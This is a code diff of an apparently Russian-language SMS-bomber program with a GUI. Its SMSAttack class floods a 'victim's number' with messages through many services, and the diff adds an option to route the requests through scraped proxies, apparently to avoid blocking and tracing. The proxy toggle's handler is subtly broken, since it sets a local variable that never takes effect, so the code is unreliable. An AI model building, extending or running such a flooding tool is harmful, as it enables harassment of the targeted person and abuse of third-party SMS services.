@@ -61,10 +61,13 @@ class Proxer:
         return self.good
 
 class SMSAttack:
-    def __init__(self, _phone):
+    def __init__(self, _phone, proxy):
         self.ua = fake_useragent.UserAgent()
-        ogobebra = Proxer()
-        self.proxy = ogobebra.proxy()
+        if proxy == True:
+            ogobebra = Proxer()
+            self.proxy = ogobebra.proxy()
+        else:
+            self.proxy = [{'http': ''}, {'http': ''}]
         self._phone = _phone
     def start(self):
         _phone = self._phone
@@ -1878,6 +1881,7 @@ class SMSAttack:
                logs.insert('insert', '\n[+] AnyTime Отправлено!')
             except:
                logs.insert('insert', '\n[-] AnyTime Hе отправлено!')
+        
 def flud():
     _phone = e1.get()
     tututu = threading.Thread(target=burjui)
@@ -1885,7 +1889,28 @@ def flud():
 
 def burjui():
     _phone = e1.get()
-    SMSAttack(_phone = _phone).start()
+    SMSAttack(_phone = _phone, proxy = proxV).start()
+
+def onProxyClick():
+    if var.get() == True:
+        proxV = True
+    else:
+        proxV = False
+
+global proxV
+proxV = False
+
+var = BooleanVar()
+
+cb = Checkbutton(root,
+    text = 'Прокси', 
+    font = ("Segoe Script", "16"),
+    bg = '#1c0f1a',
+    fg = '#f216ce',
+    variable=var,
+    command=onProxyClick)
+cb.pack()
+cb.place(x = 0, y = 127)
 
 t1 = Label(root,
     text = 'Номерок жертвы', 
